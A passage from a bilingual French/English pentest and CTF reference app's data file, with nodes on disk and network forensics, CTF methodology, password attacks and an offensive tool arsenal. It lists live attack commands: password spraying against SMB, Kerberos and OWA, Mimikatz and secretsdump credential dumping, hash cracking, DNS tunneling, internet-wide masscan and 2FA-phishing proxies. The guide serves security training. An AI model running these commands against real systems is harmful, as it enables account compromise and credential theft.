      { label: "Artefacts Windows — Event Logs, Timeline, Notifications", label_en: "Windows artifacts — Event Logs, Timeline, Notifications", cmd: "# Event Logs :\n# C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n# C:\\Windows\\System32\\winevt\\Logs\\System.evtx\n# Analyser avec EvtxCmd, Get-WinEvent (PowerShell)\n\n# Windows Timeline (ActivitiesCache.db) :\n# \\Users\\USER\\AppData\\Local\\ConnectedDevicesPlatform\\<id>\\ActivitiesCache.db\n# WxTCmd → générer CSV → ouvrir avec TimeLine Explorer\n\n# Notifications (Windows 10+) :\n# \\Users\\USER\\AppData\\Local\\Microsoft\\Windows\\Notifications\\wpndatabase.db\n# SQLite : table Notification (XML)\n\n# USB history :\n# C:\\Windows\\inf\\setupapi.dev.log (timestamps de connexion)\n# Registry : HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\n# USBDetective : usbdetective.com\n\n# Browser history (SQLite) :\nsqlite3 'C:\\Users\\USER\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History' \\\n  'SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20'" },
      { label: "Anti-forensics — détection des manipulations", label_en: "Anti-forensics — detecting manipulation", cmd: "# Timestamps NTFS :\n# $STANDARD_INFORMATION (modifiable par TimeStomp)\n# $FILE_NAME (plus difficile à modifier)\n# TimeStomp → modifie $STANDARD_INFORMATION mais PAS $FILE_NAME\n# → comparer les deux pour détecter la manipulation\n\n# USN Journal ($Usnjrnl) :\n# UsnJrnl2Csv → tracer les changements de fichiers\n# $LogFile → journal write-ahead de l'FS NTFS\n# LogFileParser pour analyser\n\n# Timestamps suspects :\n# NTFS précision 100 nanosecondes\n# Fichiers avec timestamp 2010-10-10 10:10:00.000:0000 → très suspect\n\n# Slack space (data hiding) :\n# slacker → cache données dans l'espace non utilisé des clusters\n# FTK Imager → récupérer le slack space\n# bmap --mode=slack /mnt/disk/suspicious_file.txt\n\n# ADS (Alternate Data Streams NTFS) :\nfls -o OFFSET disk.img | grep '\\$\\|:'\n# dir /r (Windows) ou streams.exe (Sysinternals)\n\n# UserAssist désactivé :\n# HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Start_TrackProgs = 0\n# Prefetch désactivé :\n# HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\Memory Management\\PrefetchParameters\\EnablePrefetcher = 0" },
      { label: "Chercher des secrets et stéganographie disque", label_en: "Find secrets and disk steganography", cmd: "# Strings globaux :\nstrings disk.img | grep -i 'flag{\\|CTF{\\|password\\|secret'\n# Données entre les partitions :\ndd if=disk.img bs=512 skip=LAST_SECTOR count=100 | strings\n# Installed programs (Debian) :\ncat /var/lib/dpkg/status | grep -E 'Package:|Status:'\ncat /var/log/dpkg.log | grep installed\n# Non-package executables :\nfind /sbin/ -exec dpkg -S {} \\; | grep 'no path found'\n# Recover deleted running binary :\ncd /proc/3746/  # PID du binaire supprimé\nhead -1 maps  # adresse en mémoire\ndd if=mem bs=1 skip=08048000 count=1000 of=/tmp/exec2\n# Autopsy (GUI) :\nautopsy  # http://localhost:9999/autopsy" }
    ],
    lookfor: [
      "Fichiers supprimés mais non écrasés → récupérables avec icat/Sleuthkit ou Autopsy",
      "Différences entre $STANDARD_INFORMATION et $FILE_NAME → manipulation de timestamps (TimeStomp)",
      "USN Journal et $LogFile → tout changement est tracé même si le fichier est supprimé",
      "Prefetch, Event Logs, UserAssist, BAM → traces d'exécution et d'activité",
      "ADS (Alternate Data Streams) NTFS → données cachées dans des streams secondaires",
      "Volume Shadow Copies → versions précédentes de fichiers supprimés ou modifiés",
      "Cron stubs et systemd transient units → persistence malware Linux"
    ],
    lookfor_en: [
      "Deleted but not overwritten files → recoverable with icat/Sleuthkit or Autopsy",
      "Differences between $STANDARD_INFORMATION and $FILE_NAME → timestamp manipulation (TimeStomp)",
      "USN Journal and $LogFile → every change is tracked even if the file is deleted",
      "Prefetch, Event Logs, UserAssist, BAM → execution and activity traces",
      "NTFS ADS (Alternate Data Streams) → data hidden in secondary streams",
      "Volume Shadow Copies → previous versions of deleted or modified files",
      "Cron stubs and systemd transient units → Linux malware persistence"
    ],
    tips: [
      "Toujours travailler sur une copie de l'image (dcfldd avec hash) — jamais sur l'originale",
      "Autopsy automatise beaucoup de l'analyse → bon point de départ, puis Sleuthkit en CLI",
      "strings disk.img | grep -i 'flag' → souvent suffisant pour les CTF simples",
      "TimeStomp modifie $STANDARD_INFORMATION mais pas $FILE_NAME — toujours comparer les deux",
      "setupapi.dev.log contient les timestamps précis de connexion des périphériques USB"
    ],
    tips_en: [
      "Always work on a copy of the image (dcfldd with hash) — never on the original",
      "Autopsy automates much of the analysis → good starting point, then Sleuthkit in CLI",
      "strings disk.img | grep -i 'flag' → often sufficient for simple CTFs",
      "TimeStomp modifies $STANDARD_INFORMATION but not $FILE_NAME — always compare both",
      "setupapi.dev.log contains precise timestamps for USB device connections"
    ],
    choices: [
      { label: "Flag trouvé dans les fichiers !", label_en: "Flag found in the files!", next: "flag_found", icon: "🏁" },
      { label: "Forensics réseau (pcap) nécessaire", label_en: "Network forensics (pcap) needed", next: "forensics_network", icon: "🌐" },
      { label: "Forensics mémoire nécessaire", label_en: "Memory forensics needed", next: "forensics_memory", icon: "🧠" }
    ]
  },

  // ── FORENSICS RÉSEAU ──────────────────────────────────────────────────────────
  "forensics_network": {
    id: "forensics_network", title: "Forensics Réseau — Analyse PCAP", title_en: "Network Forensics — PCAP Analysis", category: "ctf", icon: "🌐",
    description: "Analyser des captures réseau (PCAP) avec Wireshark, tshark, NetworkMiner et Zeek. Reconstituer des flux, extraire des fichiers transférés, décoder des protocoles, détecter de l'exfiltration DNS/ICMP, et déchiffrer TLS si clé disponible.",
    description_en: "Analyze network captures (PCAP) with Wireshark, tshark, NetworkMiner and Zeek. Reconstruct streams, extract transferred files, decode protocols, detect DNS/ICMP exfiltration, and decrypt TLS if a key is available.",
    commands: [
      { label: "Analyse initiale du PCAP", label_en: "Initial PCAP analysis", cmd: "# Statistiques globales :\ntshark -r capture.pcap -q -z io,phs\ncapinfos capture.pcap\n# Conversations TCP/UDP :\ntshark -r capture.pcap -q -z conv,tcp\ntshark -r capture.pcap -q -z conv,udp\n# PacketTotal (analyse en ligne) : packettotal.com\n# Dshell (forensics réseau) : github.com/USArmyResearchLab/Dshell" },
      { label: "Filtres Wireshark essentiels", label_en: "Essential Wireshark filters", cmd: "# HTTP :\nhttp\nhttp.request.method == 'POST'\nhttp contains 'flag'\n# TCP :\ntcp.port == 80 or tcp.port == 443\ntcp.stream eq 0\n# Credentials :\nhttp.authbasic\nftp.request.command == 'PASS'\nsmtp.req.command == 'AUTH'\n# Chercher le flag directement :\nframe contains \"flag{\"\ndata.text contains \"CTF{\"" },
      { label: "Extraire des fichiers et suivre les streams", label_en: "Extract files and follow streams", cmd: "# Wireshark GUI : File > Export Objects > HTTP (ou SMB, DICOM...)\n# tshark export objects :\ntshark -r capture.pcap --export-objects 'http,./exported/'\n# Follow TCP stream :\ntshark -r capture.pcap -q -z follow,tcp,ascii,0\ntshark -r capture.pcap -q -z follow,http,ascii,0\n# Extraire tous les streams TCP en boucle :\nfor i in $(seq 0 100); do\n  tshark -r capture.pcap -q -z follow,tcp,raw,$i 2>/dev/null | tail -n +6 \\\n  | xxd -r -p > stream_$i.bin 2>/dev/null\ndone\nfile stream_*" },
      { label: "Analyser le trafic HTTP et FTP", label_en: "Analyze HTTP and FTP traffic", cmd: "# Lister toutes les requêtes HTTP :\ntshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri\n# Voir les POSTs :\ntshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e http.request.uri -e http.file_data\n# Credentials FTP :\ntshark -r capture.pcap -Y 'ftp.request.command == PASS' -T fields -e ftp.request.arg\n# ngrep (grep sur trafic réseau) :\nngrep -I capture.pcap 'password\\|flag'" },
      { label: "Déchiffrer TLS/SSL", label_en: "Decrypt TLS/SSL", cmd: "# Wireshark : Edit > Preferences > Protocols > TLS > SSLKEYLOGFILE\n# tshark avec SSLKEYLOGFILE :\ntshark -r capture.pcap -o 'tls.keylog_file:/path/to/sslkeylogfile'\n# tshark avec clé RSA :\ntshark -r capture.pcap -o 'tls.keys_list:IP,PORT,PROTOCOL,/path/to/private.key'\n# friTap (Frida) → extraction live des clés TLS :\n# github.com/fkie-cad/friTap\n# SSLyze → analyser la config TLS d'un serveur :\nsslyze --regular target.com:443\n# testssl.sh :\ntestssl.sh target.com:443" },
      { label: "Détecter l'exfiltration — DNS, ICMP, covert channels", label_en: "Detect exfiltration — DNS, ICMP, covert channels", cmd: "# DNS (exfiltration via sous-domaines) :\ntshark -r capture.pcap -Y dns -T fields -e dns.qry.name | sort | uniq\n# Patterns suspects : sous-domaines longs, base64-encoded\n# Outils DNS tunnel : iodine, dnscat2 (github.com/iagox86/dnscat2)\niodine -f -P password 192.168.0.1 tunnel.domain.com  # client\n\n# ICMP (ping covert channel) :\ntshark -r capture.pcap -Y icmp -T fields -e data.data\n# QueenSono : exfiltration ICMP (github.com/ariary/QueenSono)\n\n# DET : exfiltration multi-canal simultané :\n# github.com/sensepost/DET\n\n# TrevorC2 : C2 caché dans site web normal :\n# github.com/trustedsec/trevorc2" },
      { label: "Outils complémentaires d'analyse réseau", label_en: "Complementary network analysis tools", cmd: "# Zeek (ex-Bro) — analyse comportementale :\nzeek -r capture.pcap\n# Génère des logs : conn.log, http.log, dns.log, ssl.log...\n\n# Suricata — signatures IDS :\nsuricata -r capture.pcap -c /etc/suricata/suricata.yaml\n\n# NetworkMiner (GUI Windows) : reconstitue les sessions\n# PacketTotal (web) : analyse automatique\n\n# Wireshark expert info :\n# Analyze > Expert Information → anomalies automatiques\n\n# scapy (Python) pour manipulation de paquets :\npython3 -c \"from scapy.all import *; pkts=rdpcap('capture.pcap'); pkts.summary()\"\n\n# tcpreplay → rejouer un PCAP :\ntcpreplay --intf1=eth0 capture.pcap" }
    ],
    lookfor: [
      "Credentials en clair : FTP, HTTP Basic, Telnet, SMTP → Wireshark les affiche directement",
      "Fichiers transférés (images, documents, archives) → File > Export Objects > HTTP",
      "DNS avec des sous-domaines longs ou base64-encoded → exfiltration DNS (iodine, dnscat2)",
      "ICMP avec payload inhabituel → covert channel (QueenSono)",
      "Trafic TLS vers des IPs inconnues → C2 chiffré"
    ],
    lookfor_en: [
      "Cleartext credentials: FTP, HTTP Basic, Telnet, SMTP → Wireshark displays them directly",
      "Transferred files (images, documents, archives) → File > Export Objects > HTTP",
      "DNS with long or base64-encoded subdomains → DNS exfiltration (iodine, dnscat2)",
      "ICMP with unusual payload → covert channel (QueenSono)",
      "TLS traffic to unknown IPs → encrypted C2"
    ],
    tips: [
      "Follow TCP Stream (clic droit sur un paquet) → reconstitue toute la conversation en ASCII",
      "tshark -Y 'frame contains \"flag{\"' -T fields -e data.text → cherche directement le flag",
      "Export Objects HTTP dans Wireshark extrait tous les fichiers téléchargés en un clic",
      "Zeek génère des logs structurés plus faciles à analyser que le PCAP brut pour les grands fichiers"
    ],
    tips_en: [
      "Follow TCP Stream (right-click on a packet) → reconstructs the full conversation in ASCII",
      "tshark -Y 'frame contains \"flag{\"' -T fields -e data.text → searches directly for the flag",
      "Export Objects HTTP in Wireshark extracts all downloaded files in one click",
      "Zeek generates structured logs easier to analyze than raw PCAP for large files"
    ],
    choices: [
      { label: "Flag trouvé dans le trafic !", label_en: "Flag found in the traffic!", next: "flag_found", icon: "🏁" },
      { label: "Fichier extrait → analyser (stégo, crypto...)", label_en: "Extracted file → analyze (stego, crypto...)", next: "forensics", icon: "🔍" },
      { label: "Forensics disque nécessaire", label_en: "Disk forensics needed", next: "forensics_disk", icon: "💾" }
    ]
  },

  // ── APPROCHE CTF ──────────────────────────────────────────────────────────────
  "ctf_approach": {
    id: "ctf_approach", title: "Approche Générale CTF", title_en: "General CTF Approach", category: "ctf", icon: "🎯",
    description: "Méthodologie pour aborder un CTF : organisation, priorités, mindset, et outils de base. Valable pour les CTFs jeopardy style et les boot2root. Sources : CTF Field Guide (Trail of Bits), ctftime.org pour les writeups.",
    description_en: "Methodology for approaching a CTF: organization, priorities, mindset, and basic tools. Valid for jeopardy-style CTFs and boot2root. Sources: CTF Field Guide (Trail of Bits), ctftime.org for writeups.",
    commands: [
      { label: "Évaluation initiale d'un challenge", label_en: "Initial challenge assessment", cmd: "# Questions à se poser :\n# 1. Quelle catégorie ? (web, pwn, rev, crypto, stego, misc, forensics)\n# 2. Quel est le format du flag attendu ?\n# 3. Qu'est-ce qui est fourni ? (binaire, pcap, image, URL, nc...)\n# 4. Indices dans le titre ou la description ?\n\n# Pour un fichier :\nfile challenge.*\nexiftool challenge.*\nstrings challenge.* | less\nbinwalk challenge.*\n# Ciphey (déchiffrement automatique AI) :\nciphey -t 'encodedstring'" },
      { label: "CTF Web — checklist rapide", label_en: "CTF Web — quick checklist", cmd: "# 1. Code source (Ctrl+U)\n# 2. Cookies et localStorage\n# 3. Robots.txt, /.git/, /.env\n# 4. feroxbuster / gobuster sur les répertoires :\nferoxbuster -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt\n# 5. Formulaires : SQLi, XSS, SSTI\n# 6. Paramètres GET/POST : LFI, SSRF, IDOR\n# 7. Headers HTTP suspects\n# 8. JWT si présent\n# 9. WhatWeb + wafw00f pour fingerprinting\nwhatweb http://target\nwafw00f http://target" },
      { label: "CTF Pwn — checklist rapide", label_en: "CTF Pwn — quick checklist", cmd: "# 1. file + checksec :\nfile binary\nchecksec --file=binary\n# 2. strings → flag hardcodé ? win() ?\nstrings binary | grep -i 'flag\\|win\\|shell'\n# 3. Ghidra pour décompiler (NSA, gratuit)\n# 4. Identifier la vuln : overflow, format string, heap\n# 5. GDB + pwndbg :\ngdb ./binary\n# 6. pwntools exploit.py\n# Linux Exploit Suggester :\npython linux-exploit-suggester.py\n# GTFOBins → binaires SUID exploitables\n# LOLBAS → Living Off The Land (Windows)" },
      { label: "CTF Crypto — checklist rapide", label_en: "CTF Crypto — quick checklist", cmd: "# 1. Identifier l'algorithme\n# 2. dcode.fr pour les classiques\n# 3. CyberChef Magic pour les encodages\n# 4. RSA → RsaCtfTool :\npython RsaCtfTool.py --publickey pub.key --uncipherfile cipher.txt\n# factordb.com\n# 5. XOR → xortool\n# 6. Hash → hashcat + rockyou.txt :\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\n# JWT Cracker (HS256) :\ngit clone https://github.com/lmammino/jwt-cracker\n# Ciphey (déchiffrement auto IA) :\nciphey -t 'ciphertext'" },
      { label: "CTF Forensics — checklist rapide", label_en: "CTF Forensics — quick checklist", cmd: "# 1. file + exiftool + strings + binwalk\n# 2. Si pcap : Wireshark > Follow TCP Stream > Export Objects\n# 3. Si image disque : Autopsy ou sleuthkit\n# 4. Si dump mémoire : Volatility\n#    strings memory.dmp | grep -i 'flag{'\n#    vol.py -f memory.dmp windows.pslist\n# 5. grep -ri 'flag{\\|CTF{' sur tout\n# 6. Chercher fichiers cachés et supprimés\n# 7. Steganography : Aperisolve.com, steghide, zsteg\n# StegCracker :\nstegcracker image.jpg /usr/share/wordlists/rockyou.txt" },
      { label: "Outils essentiels CTF à installer", label_en: "Essential CTF tools to install", cmd: "# Python + pwntools :\npip install pwntools requests\n# CTF tools collection :\ngit clone https://github.com/zardus/ctf-tools\n# SageMath (crypto) :\napt install sagemath\n# Forensics :\napt install autopsy sleuthkit foremost binwalk\n# Volatility3 :\ngit clone https://github.com/volatilityfoundation/volatility3\n# Stéganographie :\napt install steghide\npip install zsteg  # gems\n# Pwn :\napt install gdb\npip install pwndbg\n# Ghidra : ghidra-sre.org (gratuit, NSA)\n# Radare2 :\napt install radare2\n# Ciphey :\npip install ciphey\n# RsaCtfTool :\ngit clone https://github.com/Ganapati/RsaCtfTool" },
      { label: "Ressources et writeups CTF", label_en: "CTF resources and writeups", cmd: "# CTFTime.org → agenda CTF + writeups past editions\n# CTF Field Guide (Trail of Bits) :\n# trailofbits.github.io/ctf/\n# Stratégie points/temps :\n# 1. Commencer par les challenges les plus faciles\n# 2. Prendre les points 'easy' en premier (flag bonus, warmup)\n# 3. Si bloqué 30 min → passer à autre chose → revenir frais\n# 4. Regarder les catégories sous-représentées (moins de solves)\n# 5. Note tout ce que tu as essayé → évite de répéter\n# 6. Collaboration : diviser les catégories en équipe\n# Outils online :\n# CyberChef, dcode.fr, Aperisolve.com, StegOnline, factordb.com" }
    ],
    lookfor: [
      "Indices dans le nom du challenge → souvent révèle la technique",
      "Description mentionne un outil ou protocole → c'est probablement la piste",
      "Format du flag dans les règles → chercher exactement ce pattern",
      "Nombre de solves → peu de solves = challenge difficile → y revenir plus tard",
      "Catégorie : ne pas hésiter à croiser les techniques (stego + crypto, web + pwn)"
    ],
    lookfor_en: [
      "Hints in the challenge name → often reveals the technique",
      "Description mentions a tool or protocol → that's probably the lead",
      "Flag format in the rules → search for exactly that pattern",
      "Number of solves → few solves = hard challenge → come back later",
      "Category: don't hesitate to combine techniques (stego + crypto, web + pwn)"
    ],
    tips: [
      "strings | grep 'flag{' ou grep -ri 'flag' . → toujours essayer en premier",
      "CyberChef, dcode.fr, Aperisolve.com, StegOnline → outils online indispensables",
      "Ciphey (IA) tente automatiquement des dizaines d'encodages → gain de temps",
      "CTFTime.org → writeups des éditions précédentes pour comprendre le style des organisateurs"
    ],
    tips_en: [
      "strings | grep 'flag{' or grep -ri 'flag' . → always try first",
      "CyberChef, dcode.fr, Aperisolve.com, StegOnline → essential online tools",
      "Ciphey (AI) automatically tries dozens of encodings → saves time",
      "CTFTime.org → writeups from past editions to understand the organizers' style"
    ],
    choices: [
      { label: "Challenge Web CTF", label_en: "CTF Web Challenge", next: "web_ctf_patterns", icon: "🌐" },
      { label: "Challenge Pwn / Binary Exploit", label_en: "Pwn / Binary Exploit Challenge", next: "binary_exploit", icon: "💣" },
      { label: "Challenge Stéganographie", label_en: "Steganography Challenge", next: "stego_advanced", icon: "🖼️" },
      { label: "Challenge Cryptographie", label_en: "Cryptography Challenge", next: "crypto", icon: "🔐" },
      { label: "Challenge Forensics", label_en: "Forensics Challenge", next: "forensics_memory", icon: "🧠" },
      { label: "Challenge Misc", label_en: "Misc Challenge", next: "misc_ctf", icon: "🎲" }
    ]
  },

  // ── ADVANCED PASSWORD ATTACKS ─────────────────────────────────────────────────
  "password_attacks_advanced": {
    id: "password_attacks_advanced", title: "Attaques Mot de Passe Avancées", title_en: "Advanced Password Attacks", category: "password", icon: "🔓",
    description: "Techniques avancées de crackage : règles hashcat, masques, credential stuffing, password spray (Kerberos, WinRM, OWA). Outils : Hashcat, John The Ripper, CeWL, GoCrack, kerbrute, DomainPasswordSpray. Sources : awesome-pentest Hash Cracking Tools + HackTricks.",
    description_en: "Advanced cracking techniques: hashcat rules, masks, credential stuffing, password spray (Kerberos, WinRM, OWA). Tools: Hashcat, John The Ripper, CeWL, GoCrack, kerbrute, DomainPasswordSpray. Sources: awesome-pentest Hash Cracking Tools + HackTricks.",
    commands: [
      { label: "Hashcat — identifier et cracker", label_en: "Hashcat — identify and crack", cmd: "# Identifier le type de hash :\nhashid hash.txt\nhashcat --example-hashes | grep -A2 'MD5\\|SHA1\\|NTLM\\|bcrypt\\|Kerberos'\n\n# Modes courants :\nhashcat -m 0 hash.txt rockyou.txt     # MD5\nhashcat -m 100 hash.txt rockyou.txt   # SHA1\nhashcat -m 1000 hash.txt rockyou.txt  # NTLM\nhashcat -m 1800 hash.txt rockyou.txt  # sha512crypt (Linux /etc/shadow)\nhashcat -m 3200 hash.txt rockyou.txt  # bcrypt (lent!)\nhashcat -m 13100 hash.txt rockyou.txt # Kerberos TGS (Kerberoast)\nhashcat -m 18200 hash.txt rockyou.txt # AS-REP (ASREPRoast)" },
      { label: "Hashcat — règles, masques, hybride", label_en: "Hashcat — rules, masks, hybrid", cmd: "# Règles (transformer les mots de la wordlist) :\nhashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\nhashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule\n\n# Masques (bruteforce structuré) :\nhashcat -m 0 hash.txt -a 3 '?u?l?l?l?d?d?d?d'  # 1Majuscule+3min+4chiffres\nhashcat -m 0 hash.txt -a 3 '?a?a?a?a?a?a?a?a'  # 8 chars tous types\n# ?l=lowercase, ?u=uppercase, ?d=digit, ?s=special, ?a=all\n\n# Attaque hybride (wordlist + masque) :\nhashcat -m 0 hash.txt -a 6 rockyou.txt '?d?d?d?d'  # mot+4chiffres\n\n# GoCrack (management web pour sessions hashcat distribuées)" },
      { label: "Créer une wordlist personnalisée (OSINT)", label_en: "Create a custom wordlist (OSINT)", cmd: "# CeWL — wordlist depuis un site web (awesome-pentest) :\ncewl http://target.com -m 6 -d 3 -w wordlist.txt\ncewl http://target.com -m 6 --email -w wordlist_with_emails.txt\n\n# Crunch — génération par pattern :\ncrunch 8 8 -t 'Company@@@' -o wordlist.txt\ncrunch 6 8 0123456789 -o nums.txt\n\n# duplicut — dédoublonner sans OOM sur grandes wordlists :\nduplicut -t 8 -p wordlist.txt | pv > dedup.txt\n\n# BruteForce Wallet (wallet.dat chiffrés) :\n# github.com/glv2/bruteforce-wallet" },
      { label: "John The Ripper — conversions et crack", label_en: "John The Ripper — conversions and crack", cmd: "# Lister les formats supportés :\njohn --list=formats | grep -i 'md5\\|sha\\|ntlm\\|bcrypt'\n\n# Crack :\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\njohn --rules --wordlist=wordlist.txt hash.txt\n\n# Convertir des fichiers protégés :\nzip2john protected.zip > zip.hash && john zip.hash --wordlist=rockyou.txt\nssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt\npdf2john document.pdf > pdf.hash && john pdf.hash --wordlist=rockyou.txt\nrar2john archive.rar > rar.hash && john rar.hash\n# Rar Crack : rarcrack.sourceforge.net" },
      { label: "Password Spray — éviter le lockout", label_en: "Password Spray — avoid lockout", cmd: "# CrackMapExec / NetExec — spray SMB (1 pass / tous les users) :\ncrackmapexec smb TARGET -u users.txt -p 'Password123' --no-bruteforce --continue-on-success\ncrackmapexec winrm TARGET -u users.txt -p 'Password123' --no-bruteforce\n\n# Kerbrute — spray Kerberos (pas de lockout classique) :\nkerbrute passwordspray -d domain.local users.txt 'Password123'\n\n# DomainPasswordSpray (PowerShell, awesome-pentest) :\nImport-Module DomainPasswordSpray.ps1\nInvoke-DomainPasswordSpray -Password 'Password123' -OutFile spray_success.txt\n\n# SprayingToolkit — OWA, Lync/S4B, O365 :\npython spraytool.py -u users.txt -p passwords.txt --owa https://mail.target.com\n\n# Timing : 1 tentative/utilisateur toutes les X minutes pour éviter lockout" },
      { label: "Extraction et déchiffrement de credentials", label_en: "Credential extraction and decryption", cmd: "# Impacket (depuis Linux) :\nimpacket-secretsdump DOMAIN/USER:PASS@TARGET\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL\n# Fichiers SAM :\nreg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n\n# Mimikatz (Windows admin/SYSTEM) :\nmimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'\n\n# mcafee-xpass (awesome-pentest) — décrypter Sitelist.xml McAfee :\n# github.com/SujalMeghwal/mcafee-xpass\n\n# JWT Cracker (HS256) :\ngit clone https://github.com/lmammino/jwt-cracker\nnode jwt-cracker.js eyJhbGciOiJIUzI1NiJ9... alphabet 6\n\n# Keyscope — valider des secrets actifs contre SaaS vendors :\n# github.com/SpectralOps/keyscope" }
    ],
    lookfor: [
      "Type de hash : longueur + charset + contexte (MD5=32hex, bcrypt=$2y$, NTLM=32hex)",
      "Application qui compare un hash → rainbow table ou crackage offline",
      "Users connus → wordlist personnalisée avec CeWL + infos OSINT (mentions du nom, ville, etc.)",
      "Domaine AD → Kerberoasting (TGS, -m 13100) ou ASREPRoasting (-m 18200) pour hashes offline"
    ],
    lookfor_en: [
      "Hash type: length + charset + context (MD5=32hex, bcrypt=$2y$, NTLM=32hex)",
      "Application that compares a hash → rainbow table or offline cracking",
      "Known users → custom wordlist with CeWL + OSINT info (name mentions, city, etc.)",
      "AD domain → Kerberoasting (TGS, -m 13100) or ASREPRoasting (-m 18200) for offline hashes"
    ],
    tips: [
      "rockyou.txt + best64.rule couvre 80% des mots de passe faibles en CTF",
      "OneRuleToRuleThemAll.rule est souvent plus efficace que best64 pour les challenges CTF",
      "bcrypt est très lent → prioriser une wordlist très ciblée (CeWL + OSINT)",
      "duplicut (awesome-pentest) dédoublonne rapidement les wordlists géantes sans OOM",
      "Password spray avec kerbrute sur Kerberos : pas de verrouillage de compte classique"
    ],
    tips_en: [
      "rockyou.txt + best64.rule covers 80% of weak passwords in CTF",
      "OneRuleToRuleThemAll.rule is often more effective than best64 for CTF challenges",
      "bcrypt is very slow → prioritize a very targeted wordlist (CeWL + OSINT)",
      "duplicut (awesome-pentest) quickly deduplicates massive wordlists without OOM",
      "Password spray with kerbrute on Kerberos: no classic account lockout"
    ],
    choices: [
      { label: "Mot de passe trouvé → tester l'accès", label_en: "Password found → test access", next: "credentials_found", icon: "🏆" },
      { label: "Kerberoasting → cracker les TGS", label_en: "Kerberoasting → crack the TGS", next: "kerberoasting", icon: "🎟️" }
    ]
  },

  // ── AWESOME TOOLS — ARSENAL PAR CATÉGORIE ────────────────────────────────────
  "awesome_tools": {
    id: "awesome_tools", title: "Arsenal d'Outils — Awesome Pentest", title_en: "Tool Arsenal — Awesome Pentest", category: "recon", icon: "🛠️",
    description: "Sélection d'outils issus de awesome-pentest, organisés par domaine. Référence rapide pour trouver le bon outil selon la phase ou la catégorie d'attaque.",
    description_en: "Selection of tools from awesome-pentest, organized by domain. Quick reference for finding the right tool for each phase or attack category.",
    commands: [
      { label: "Frameworks multi-paradigmes", label_en: "Multi-paradigm frameworks", cmd: "# Metasploit — framework d'exploitation de référence :\nmsfconsole\nuse exploit/multi/handler\n# Armitage (GUI Java pour Metasploit)\n# Faraday — environnement pentest multi-utilisateurs :\n# github.com/infobyte/faraday\n# Pupy — RAT cross-platform (Windows/Linux/macOS/Android) :\n# github.com/n1nj4sec/pupy\n# Ronin — toolkit Ruby pour security research :\n# ronin-rb.dev\n# AutoSploit — exploiter automatiquement les targets Shodan :\n# github.com/NullArray/AutoSploit" },
      { label: "Network Tools — recon et exploitation", label_en: "Network Tools — recon and exploitation", cmd: "# CrackMapExec / netexec — couteau suisse réseau AD :\ncrackmapexec smb 192.168.1.0/24 -u admin -p pass\n# Nmap — scanner de référence :\nnmap -sV -sC -p- $TARGET\n# RustScan — port scan ultra-rapide :\nrustscan -a $TARGET -- -sV -sC\n# masscan — scan Internet-scale :\nmasscan 0.0.0.0/0 -p80,443 --max-rate 100000\n# Legion (GUI, ex-SPARTA) — discovery semi-automatique\n# THC Hydra — brute force réseau multi-protocoles :\nhydra -l admin -P rockyou.txt ssh://TARGET\n# impacket — classes Python pour protocoles réseau :\nimpacket-smbclient //TARGET/share -U user%pass\n# dnstwist — typosquatting de domaines :\ndnstwist target.com" },
      { label: "MITM et proxies réseau", label_en: "MITM and network proxies", cmd: "# BetterCAP — MITM framework modulaire :\nbettercap -iface eth0\n# Ettercap — suite MITM complète :\nsudo ettercap -T -q -M arp:remote /GATEWAY/ /TARGET/\n# SSH MITM — intercepter sessions SSH :\n# github.com/jtesta/ssh-mitm\n# Evilginx2 — reverse proxy MitM (defeat 2FA) :\nevilginx2\n# Modlishka — reverse proxy 2FA phishing :\n# github.com/drk1wi/Modlishka\n# MITMf — framework Man-In-The-Middle :\n# PETEP — proxy TCP/UDP extensible avec GUI\n# friTap (Frida) — intercepter SSL/TLS live" },
      { label: "Web Exploitation", label_en: "Web Exploitation", cmd: "# Burp Suite — intercepting proxy (indispensable) :\n# Nikto — scanner web rapide :\nnikto -h http://target.com\n# WPScan — scanner WordPress :\nwpscan --url http://target.com --enumerate u,p,t\n# nuclei — scanner template-based :\nnuclei -u http://target.com -as\n# gobuster — brute force web :\ngobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt\n# feroxbuster — ferme et récursif :\nferoxbuster -u http://target\n# wafw00f — détecter les WAF :\nwafw00f http://target.com\n# WhatWaf — bypass WAF :\n# Wappalyzer — fingerprinting technologies\n# w3af, Arachni, Wapiti — scanners web\n# sqlmap — SQLi automatique :\nsqlmap -u 'http://target.com/page?id=1' --dbs" },
      { label: "Exploit Development et Reverse Engineering", label_en: "Exploit Development and Reverse Engineering", cmd: "# pwntools — framework exploit CTF :\nfrom pwn import *\np = process('./binary')\n# GDB + pwndbg (ou peda) :\ngdb ./binary\n# Ghidra — décompilateur NSA (gratuit) :\nghidraRun\n# Radare2 — framework RE open source :\nr2 ./binary\naaa; pdf @ main\n# Frida — instrumentation dynamique :\nfrida -n com.app -l script.js\n# angr — analyse binaire symbolique :\npython3 -c 'import angr; p=angr.Project(\"./binary\"); print(p.arch)'\n# Capstone — désassembleur multi-archi\n# IDA Free : hex-rays.com\n# x64dbg (Windows)\n# ropper — trouver ROP gadgets :\nropper --file ./binary --search 'pop rdi'" },
